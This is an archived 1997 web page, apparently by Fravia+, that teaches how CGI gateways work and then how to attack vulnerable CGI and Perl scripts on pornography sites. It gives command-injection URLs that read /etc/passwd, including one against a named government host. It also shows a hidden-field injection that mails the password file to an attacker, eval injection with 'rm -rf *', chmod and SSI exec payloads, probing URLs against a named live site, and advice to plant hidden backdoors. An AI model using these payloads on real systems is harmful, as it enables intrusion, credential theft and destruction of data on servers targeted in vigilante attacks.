@@ -1,0 +1,808 @@
+<HTML>
+
+<HEAD>
+
+<TITLE>ideale3</TITLE>
+
+</HEAD>
+
+<BODY BGCOLOR=#C0C0C0 TEXT=#001010 VLINK=#405040>
+
+<A NAME="anchortop"></A>
+
+<!-- Begin Introdo -->
+
+<CENTER>
+
+<A href="ideale.htm" tppabs="http://www.anticrack.de/fravia/ideale.htm"><IMG SRC="antism.gif" tppabs="http://www.anticrack.de/fravia/antism.gif" ALT="No_commercial!" 
+
+ALIGN=BOTTOM WIDTH=114 HEIGHT=43 BORDER=0 VSPACE=0 HSPACE=0></A>
+
+<BR>
+
+<FONT color=gray>Crackers against Smut</FONT>
+
+
+
+</CENTER>
+
+<H1>
+
+<FONT size=+5>
+
+<CENTER>Fravia's <FONT color=red>CGI-script reversing</FONT><BR>page ONE</FONT></CENTER></H1>
+
+<CENTER>
+
+<B>(CGI-script reverse engineering)</B><BR>
+
+~<BR>
+
+<B>(How to exploit weak CGI-script and PERL programs used by the Smut dealers)</B><BR>
+
+(How to nuke a page against the will of its owner)<BR>
+
+<BR>~<BR>
+
+By Fravia+, Updated <FONT color=red>27 November 1997</FONT><BR>Page severely under construction... 
+
+SEND MORE CONTRIBUTIONS!
+
+</CENTER><BR><HR size=2>
+
+<!-- Begin whatwewant -->
+
+<I>
+
+What is CGI-script reverse engineering?<BR>
+
+Well, if we want to crack the smut dealers, we must first understand a little 
+
+how their gateways 
+
+work... so first of all  you must understand what are gateways... in fact there 
+
+is quite a lot you should understand before waging this battle... let's begin!
+
+<BR>
+
+Remember that you can use gateways running on Internet, install gateways that 
+
+have been developed by others or develop your own.
+
+<BR>
+
+The CGI is the mechanism for communicating between your gateway and your Web 
+
+server.<BR>
+
+Let's be clear on this: When the user enters text on a form, or in response 
+
+to an ISINDEX query, and hits the return key, the Web browser sends keystrokes 
+
+captured from the user to the httpd server.<BR>
+
+When an HTML document contains an ISINDEX tag, the browser displays an input box with the phrase:<BR></I><PRE>
+
+This is a searchable index. Enter search keywords: type-input-here</PRE><I>
+
+Here you have an example of it:<ISINDEX><BR>
+
+This does NOT mean that your HTML document is automatically a searchable index. The 
+
+ISINDEX tag just captures user keystrokes and sends those keystrokes to a gateway using 
+
+the GET method. The GATEWAY performs the actual search. If the gateway does not exist, 
+
+placing the ISINDEX tag in the HTML document will not make it exist, altough it will 
+
+look to the user as though it exists. The user can certainly key in a search string. 
+
+But when the return key is hit, no search will occur. Try it on the ISINDEX window above.Now.<BR> 
+
+Nothing happens: to have your Web server 
+
+perform search functions you must develop or set up a gateway to perform the search. 
+
+<BR>
+
+The htppd server accepts the input, which will come through a FORM or an ISINDEX tag, 
+
+starts up the gateway 
+
+and hands the input to the gateway via the CGI.<BR>
+
+The user's keystrokes are passed to the gateway either via environment variables 
+
+(called the GET method) or using standard input (called the POST method). The 
+
+gateway then passes the input and process it. It may generate HTML output, which 
+
+is returned to the httpd server to pass to the client, or it may save data in a 
+
+file or database or send email to someone.<BR>
+
+<BR>
+
+The gateway itself can be a script or program, written in C/C++, Perl, tcl, 
+
+the C Shell or the Bourne Shell. Each language has its own strengths as a 
+
+gateway language.<BR>
+
+<BR>
+
+CGI gateways that generate HTML output are required to preface the HTML output 
+
+to stdout with the following line:<BR><PRE>
+
+Content-type: text/html</PRE>
+
+This line must be followed by a blank line before the first &lt;HTML&gt; tag is sent.<BR>
+
+<BR>
+
+The gateway does not have to generate HTML. It could return the URL of another file, 
+
+indicating to the browser that it should get that file. This is called <U>URL 
+
+redirection</U>. In fact this is the most commonly used method that the 
+
+commercial smut-dealers 
+
+use to pass some specific images to the user<BR>
+
+CGI gateways using URL redirection write the following line to 
+
+stdout:<BR></I><PRE>
+
+Location: URL</PRE><I>
+
+This line, too, must be followed by a blank line before the stdout data stream 
+
+terminates.<BR>
+
+<BR>
+
+Passing parameters to CGI scripts by appending them to the URL is referred to as 
+
+the GET method. 
+
+CGI scripts written to use the GET method must explicitly read the QUERY_STRING 
+
+variable to get and then parse the query. The GET method is usually used to invoke 
+
+a simple CGI script with a single parameter.<BR>
+
+<BR>
+
+For example, to pass your name (Fravia of TheHCU) to the test-cgi gateway, located 
+
+in cgi-bin, you would open the following URL:<BR><PRE>
+
+http://hostname/cgi-bin/test-cgi?Fravia+of+TheHCU</PRE>
+
+The incoming parameter is appended to the base URL after the ? character, with 
+
+blanks replaced by the + character. The parameter is set as an environment variable 
+
+called QUERY_STRING, but is not passed to test-cgi as a command line option, or in 
+
+standard input. The HTML output returned from this URL would be (since test-cgi 
+
+describes how the httpd server is configured and what information is being passed 
+
+generically to all CGI scripts, more or less the following:<BR></I><PRE>
+
+CGI/1.0 test script report:
+
+
+
+argc is 3. Argv is Fravia of TheHCU
+
+
+
+SERVER_SOFTWARE = NCSA/1.3
+
+SERVER_NAME = hostname
+
+GATEWAY_INTERFACE = CGI/1.1
+
+SERVER_PROTOCOL = HTTP/1.0
+
+SERVER_PORT = 80
+
+REQUEST_METHOD = GET
+
+HTTP_ACCEPT = text/plain, application/x-html, application/html,
+
+text/x-html, text/html, image/*, application/postscript, video/mpeg,
+
+audio/basic, audio/x-aiff, image/gif, image/Jpeg, image/tiff,
+
+...
+
+...
+
+text/richtext, text/tab-separated-values, text/x-setext, */*
+
+PATH_INFO =
+
+PATH_TRANSLATED =
+
+SCRIPT_NAME = /cgi-bin/test-cgi
+
+QUERY_STRING = Fravia+of+TheHCU
+
+REMOTE_HOST = xxx.xxx.xxx
+
+REMOTE_ADDR = xxx.xxx.xxx.xxx
+
+REMOTE_USER =
+
+AUTH_TYPE =
+
+CONTENT_TYPE =
+
+CONTENT_LENGTH =</PRE><I>
+
+All of the capitalized variable names (like SERVER_NAME) are environment 
+
+variables that are set by the CGI. These are available to be used by your 
+
+gateway. As you have seen, parameters can be passed to a gateway by appending 
+
+them to the URL using the following scheme:<BR></I><PRE>
+
+URL?first+second+third</PRE><I>
+
+<BR>
+
+That was it for the GET method. 
+
+<BR>Alternatively, parameters can be passed to CGI 
+
+scripts using standard input, this is called the POST method. It is used when 
+
+there is a large amount of information that would be awqward to append to the 
+
+end of the URL (as with the GET method) or when the parameters need to be encoded. 
+
+Most of the advanced work on secure transactions on the net is focused on secure 
+
+encoding techniques for the POST method.<BR>
+
+<BR>
+
+When using the POST method, two parameters, for a user's name and email 
+
+address, might look like:<BR></I><PRE>
+
+NAME=Fravia+of+TheHCU&EMAIL=msre@chez.com</PRE><I>
+
+The CGI script would then parse the two parameters as:<BR></I><PRE>
+
+NAME		Fravia of TheHCU
+
+EMAIL		msre@chez.com</PRE><I>
+
+The & character separates the parameter pairs and the = character separates each 
+
+parameter name from his value. The + character is used again as a substitute for 
+
+blanks. The Perl CGI library contains code to parse standard input to load an 
+
+associative array for processing.<BR>
+
+<BR>
+
+If the CGI-scripts are not carefully written the server can have problems: anytime 
+
+it captures user keystrokes, those keystroke could be malicious. Attacking a Web 
+
+server usually consist in embedding shell metacharacters inside our input, seeking 
+
+the execution of 
+
+arbitrary commands on the system that runs the gateway, a danger particularly common, 
+
+with older CGI gateways written in the Bourne or C Shell, in Perl or in any language 
+
+where an interpreter can execute commands external to the gateway.<BR>
+
+<BR>
+
+Rather than trapping "problem" metacharacters, the CGI scripts use simply 
+
+a regular expression to check for legal keystrokes:<BR></I><PRE>
+
+[a-zA-Z0-9_-+ \t\/@%]</PRE><I>(There is a blank space after the + sign)<BR>
+
+<BR>
+
+<FONT color=red>Now starts the really interesting part :-)</FONT><BR>
+
+The "newline" char is often allowed (%0a), and you can use it to execute commands 
+
+that are DIFFERENT from the commands that the script awaits, you can therefore add 
+
+a field to a URL to execute functions that are outside the script, for example the 
+
+following URL asks from the server a copy of /etc/passwd:<BR><PRE>
+
+http://www.odci.gov/cgi-bin/query?%0a/bin/cat%20/etc/passwd</PRE>
+
+The characters ASCII "0a" and "20" are respectively a newline and a space.<BR>
+
+<BR></I><FONT size=+2>Form processing</FONT><BR>
+
+Forms are a natural progression from simple queries and are officially part of HTML 
+
+version 3.0.<BR>
+
+Here you have an example:<BR><HR size=2><FONT color=purple>
+
+<EM>Please send us your comments!</EM>
+
+<P>
+
+<HR size=1 width=33%>
+
+<P>
+
+<FORM METHOD="POST" ACTION="http://fravia.org/cgi-bin/comments" >
+
+Name: <INPUT TEXT NAME="feedback_name" size=36><BR>
+
+Email: <INPUT TEXT NAME="feedback_email" size=36><BR>
+
+<P>
+
+<TEXTAREA NAME="feedback_comments" ROWS=4 COLS=30>
+
+</TEXTAREA>
+
+<P>
+
+<INPUT TYPE="submit" VALUE="Send Comments">
+
+<INPUT TYPE="reset" VALUE="Clear Form">
+
+</FORM></FONT>
+
+<HR size=2>
+
+<BR>
+
+<I>
+
+Each INPUT tag has a variable name associated. The CGI scripts filter the contents 
+
+of the field INPUT, if they don't you have a similar situation ro the previous one, 
+
+and your data are directly passed to the interpreter.<BR><BR>
+
+Another used HTML tag is the SELECT tag, that allows to the user on the client 
+
+machine to select between a number of options. This selection gives also a value 
+
+to a specified variable.<BR>
+
+The CGI-scripts usually DO NOT check this value, assuming that there is only a 
+
+predefined number of choices, and these values go directly to the interpreter 
+
+for interpreted languages.<BR>
+
+A typical sendmail attack is made using the characters "~!", on vulnerable systems.<BR>
+
+If there is a CGI-script with a call to the UNIX system with only ONE argument, 
+
+you can attack that system, because the system in that case forks a shell in order
+
+ to allow the request, for instance the following PERL script:<BR></I><PRE>
+
+system("/usr/bin/sendmail -t %s &lt; %s", $address_to_email &lt; $file_entered</PRE><I>
+
+has been designed to email a copy of file_entered to the email address 
+
+address_to_email. Since the script calls system with only one argument, 
+
+this program runs a separated shell, apt to be forked.<BR>
+
+Now copy and MODIFY the same data:<BR></I>
+
+<PRE>
+
+&lt;INPUT TYPE="HIDDEN" NAME="address_to_email" VALUE="address@server.com;mail cracker@his.address &lt;/etc/passwd"&gt;
+
+</PRE>
+
+<I>
+
+You get it? In this way you can get the file /etc/passwd of that server<BR>
+
+<BR>
+
+The function system() is not the only command to fork a new shell. 
+
+The function exec(), with only one argument allows the same attacks. 
+
+Opening a file and piping its result opens also a separate shell. 
+
+In PERL the function :<BR></I><PRE>
+
+open(FILE, "| program_name $ARGS")</PRE><I>
+
+opens a FILE and pipes its contents with program_name, which will be executed as 
+
+separated shell.<BR>
+
+<BR>
+
+The PERL command "eval" executes any argument you pass. The CGI-script that pass 
+
+user data to the command 
+
+eval can be used to execute ANYTHING that the user wishes, on the 
+
+smut dealers sites I would suggest, first to check if the "" passed to 
+
+the interpreter are accepted<BR></I><PRE>
+
+$_ = $VALUE; s/"/\\" /g		$RESULT = eval qq/"$_"/;</PRE><I><BR>
+
+And then <FONT color=red>destroy</FONT> the smut dealer server with VALUE 
+
+containing<BR></I><PRE>
+
+"rm -rf *"</PRE><I>
+
+<BR>
+
+CGI-script are READABLE, and you can copy them, modify them or substitute them.<BR>
+
+PERL scripts containing include lines like the following:<BR></I><PRE>
+
+require "cgi-lib"</PRE><I>
+
+Include the cgi-lib library. If the file permissions are not correct, 
+
+the script IS vulnerable! You may want to verify the permission adding to the 
+
+URL of a cgi-script (using the method GET) following characters:<BR></I><PRE>
+
+"%0a/bin/ls%20-la%20/usr/src/include</PRE><I><BR>
+
+If you copy, modify and substitute the library, you will be able to execute 
+
+commands or routines from inside the library file.<BR>
+
+<BR>
+
+The PERL interpreter dwells mostly in usr/bin. If it has been run as SETSUID 
+
+root, you may modify the file permissions with a direct command to the system:<BR></I><PRE>
+
+$_ = "chmod 666\/etc\/passwd" $RESULT = eval qq/"$_"/;</PRE><I><BR>
+
+And now the passwd file can be accessed by everybody.<BR>
+
+<BR>
+
+Finally there is an extension that some http server allow: the SSI (Server Side 
+
+Include). Most SSI have been disabled, but there are still many out there. 
+
+The syntax is:<BR></I><PRE>
+
+!-- #command variable="value" --</PRE><I><BR>
+
+If the script does not filter the input, you may write:<BR></I><PRE>
+
+!-- #exec cmd="chmod 666 /etc/passwd" --</PRE><I>
+
+"exec cmd" then runs a shell and executes the command you wrote between "", in 
+
+this case chmod. Obviously as soon as you gain etc/passwd you can lame the site 
+
+of the Smut dealer, or even better, 'seed' therein hundred concealed 'entrances' 
+
+for later eaiser busting :-)<BR><BR>
+
+<FONT size=+2>Where are located the CGI-scripts?</FONT><BR>
+
+CGI scripts can be placed in THREE locations, the main cgi-bin subdirectory, 
+
+alternative, cgi-bin subdirectories (that have been established with the 
+
+ScriptAlias directive) AND in users' personal HTML subdirectories.<BR>
+
+Web server administrators police very seldom all these areas, mostly (if 
+
+they do it) they limit themselves to check that the Options directive, used to 
+
+protect users' personal HTML directories is not set to All or ExecCGI.<BR>
+
+On the other hand, if they don't trust a SPECIFIC user, they usually specify 
+
+the Options directive in access.conf to be used server-wide and then use<BR><PRE>
+
+AllowOverride None</PRE>
+
+Here are, courtesy of +gthorne, some nice 'starter' tricks you may want to 
+
+use to UNDERSTAND how all this work and how frequently Web servers allow 
+
+you more access than it you would believe (PLEASE, do not destroy yet 
+
+vrysex.com, I need it alive for teaching purposes):<BR><PRE>
+
+http://www.vrysex.com/cgi-bin/nph-test-cgi?*<BR></PRE>
+
+(This gives information even if not available :-)<BR><PRE>
+
+http://www.vrysex.com/cgi-bin/test-cgi?*
+
+http://www.vrysex.com/cgi-bin/nph-test-cgi?/*
+
+http://www.vrysex.com/cgi-bin/nph-test-cgi?etc/*<BR></PRE>
+
+Remeber also that the standard Web account (the default user ID) 
+
+is called<BR><PRE>
+
+Username: nobody<BR></PRE>
+
+This isn't root, of course, but it gives nevertheless access to all that
+
+ an user can if he has an account on the system (otherwise web pages 
+
+wouldn't work at all. BTW, the dafault Group is -1
+
+<BR><BR>
+
+<FONT size=+2>Defaults of a standalone daemon</FONT><BR>
+
+<FONT size=+1>(know what you should be looking for on the smut sites)</FONT><BR>
+
+<BR>
+
+<FONT color=blue>httpd.conf</FONT> = Main server configuration file<BR>
+
+<I>This controls HOW the server runs, not details relating to the files it serves</I><BR>
+
+<FONT color=blue>srm.conf</FONT>	= Server resource configuration file<BR>
+
+<I>
+
+DocumentRoot directive, points per default to /usr/local/etc/httpd/htdocs
+
+<BR>
+
+UserDir = public_html per default! If the seradm forgot to set it to DISABLED, 
+
+users could serve files from their home directories!<BR>
+
+If the cgi-bin directory is not at default location /usr/local/etc/httpd/cgi-bin/, its new location can 
+
+be found inside the Alias or ScriptAlias directives!<BR>
+
+AccessFileName = .htaccess<BR>
+
+DocumentRoot = /usr/local/etc/httpd/htdocs<BR>
+
+
+
+</I>
+
+<BR>
+
+<FONT color=blue>access.conf</FONT> = Global access control file (ACF)<BR>
+
+<BR>
+
+Default User ID (UID) =	nobody<BR>
+
+Default User Group (UIG) = -1<BR>
+
+Recommended UID = http<BR>
+
+Reccomended UIG = WWW<BR>
+
+<I>(These names must exist in /etc/passwd and etc/group respectively)</I><BR>
+
+ServerAdmin =	webmaster@local.domain<BR>
+
+ServerRoot = /usr/local/etc/passwd<BR>
+
+ServerName = www.local.domain (or a CNAME alias)<BR>
+
+ServerType = standalone<BR>
+
+
+
+
+
+<BR><HR size=2 width=55%>
+
+<FONT size=+2>A first Conclusion</FONT><BR>
+
+The incorrect use of the CGI scripts implies many vulnerabilities for the 
+
+system hosting them.<BR>
+
+Most smut dealer have little or no knowledge of programming but NEED always 
+
+some sort of script to give the authorised suckers their smut and leave out 
+
+everybody else... mostly they will have set their scripts on the quick way, 
+
+using often incapable programmers... a world of possibilities for us!
+
+</I><BR><BR>
+
+
+
+
+
+
+
+
+
+<BR><CENTER>
+
+<BR></FONT>
+
+
+
+<FONT size=+3>
+
+Good luck, good hunt!<BR></FONT>
+
+</CENTER>
+
+
+
+<!-- Begin this section mover -->
+
+<HR ALIGN=CENTER WIDTH=100% SIZE=3><CENTER>
+
+<A href="ideale.htm" tppabs="http://www.anticrack.de/fravia/ideale.htm"><IMG SRC="antism.gif" tppabs="http://www.anticrack.de/fravia/antism.gif" ALT="No_commercial!" 
+
+ALIGN=BOTTOM WIDTH=114 HEIGHT=43 BORDER=0 VSPACE=0 HSPACE=0></A>
+
+<BR>
+
+<FONT color=gray>Crackers against Smut</FONT>
+
+
+
+</CENTER>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 BORDER=0 
+
+VSPACE=0 HSPACE=0><A href="ideale.htm" tppabs="http://www.anticrack.de/fravia/ideale.htm">Antismut main page</A> 
+
+<BR>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 BORDER=0 
+
+VSPACE=0 HSPACE=0><A href="general.htm" tppabs="http://www.anticrack.de/fravia/general.htm">A general approach</A>
+
+<BR>
+
+
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 BORDER=0 
+
+VSPACE=0 HSPACE=0><A href="ideale1.htm" tppabs="http://www.anticrack.de/fravia/ideale1.htm">combing</A> i.e. how to find the 
+
+"commercial smut" sites
+
+<BR>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 BORDER=0 
+
+VSPACE=0 HSPACE=0><A href="ideale2.htm" tppabs="http://www.anticrack.de/fravia/ideale2.htm">source checking</A> i.e. how to exploit 
+
+their intrinsic weaknesses
+
+<BR>
+
+
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 BORDER=0 
+
+VSPACE=0 HSPACE=0><A href="ideale4.htm" tppabs="http://www.anticrack.de/fravia/ideale4.htm">cgi-script two</A> CGI-tricks, page 
+
+two
+
+<BR>
+
+
+
+<!-- End this section mover -->
+
+<HR ALIGN=CENTER WIDTH=100% SIZE=3>
+
+<!-- Begin  main mover -->
+
+<CENTER>
+
+<FONT size=+2>Fravia's main site</FONT>
+
+<BR>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="index.html" tppabs="http://www.anticrack.de/fravia/index.html">homepage</A>   
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="orc.htm" tppabs="http://www.anticrack.de/fravia/orc.htm">+ORC</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="noanon.htm" tppabs="http://www.anticrack.de/fravia/noanon.htm">anon</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="coumes.htm" tppabs="http://www.anticrack.de/fravia/coumes.htm">counter measures</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="tools.htm" tppabs="http://www.anticrack.de/fravia/tools.htm">tools</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="academy.htm" tppabs="http://www.anticrack.de/fravia/academy.htm">+HCU Academy</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="stalking.htm" tppabs="http://www.anticrack.de/fravia/stalking.htm">stalking</A> 
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="slaves.htm" tppabs="http://www.anticrack.de/fravia/slaves.htm">enslavement</A> 
+
+<BR> 
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="student.htm" tppabs="http://www.anticrack.de/fravia/student.htm">students' essays</A> 
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="cocktail.htm" tppabs="http://www.anticrack.de/fravia/cocktail.htm">cocktails</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="links.htm" tppabs="http://www.anticrack.de/fravia/links.htm">links</A> 
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="searengi.htm" tppabs="http://www.anticrack.de/fravia/searengi.htm">search_forms</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="info.htm" tppabs="http://www.anticrack.de/fravia/info.htm">mail_fravia+</A> 
+
+<BR>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="legal.htm" tppabs="http://www.anticrack.de/fravia/legal.htm">Is reverse engineering legal?</A> 
+
+</CENTER>
+
+<!-- End main mover -->
+
+
+
+
+
+</BODY>
+
+</HTML>
+
